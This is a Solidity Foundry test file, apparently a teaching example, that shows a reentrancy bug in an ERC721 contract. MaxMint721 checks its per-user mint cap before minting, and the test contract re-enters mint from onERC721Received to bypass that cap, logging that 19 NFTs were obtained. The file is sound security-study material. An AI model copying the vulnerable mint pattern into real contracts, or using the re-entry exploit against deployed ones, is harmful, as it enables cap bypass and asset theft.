// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";

contract ContractTest is Test {
    MaxMint721 MaxMint721Contract;
    bool complete;
    uint maxMints = 10;
    address alice = vm.addr(1);
    address eve = vm.addr(2);

    function testSafeMint() public {
    MaxMint721Contract = new MaxMint721();
    MaxMint721Contract = new MaxMint721();
    MaxMint721Contract.mint(maxMints);
    console.log("Bypassed maxMints, we got 19 NFTs");
    console.log("NFT minted:", MaxMint721Contract.balanceOf(address(this)));

    }
    function onERC721Received(
    address,
    address,
    uint256,
    bytes memory
  ) public returns (bytes4) {
    if (!complete) {
      complete = true;
      MaxMint721Contract.mint(maxMints - 1);
    }
    return this.onERC721Received.selector;
  }
    receive() payable external{}

}


contract MaxMint721 is ERC721Enumerable {
  uint public MAX_PER_USER = 10;

  constructor() ERC721("ERC721","ERC721") {}

  function mint(uint amount) external {
    require(balanceOf(msg.sender) + amount <= MAX_PER_USER, "exceed max per user");
    for (uint256 i = 0; i < amount; i++) {
      uint mintIndex = totalSupply();
      _safeMint(msg.sender, mintIndex);
    }
  }
}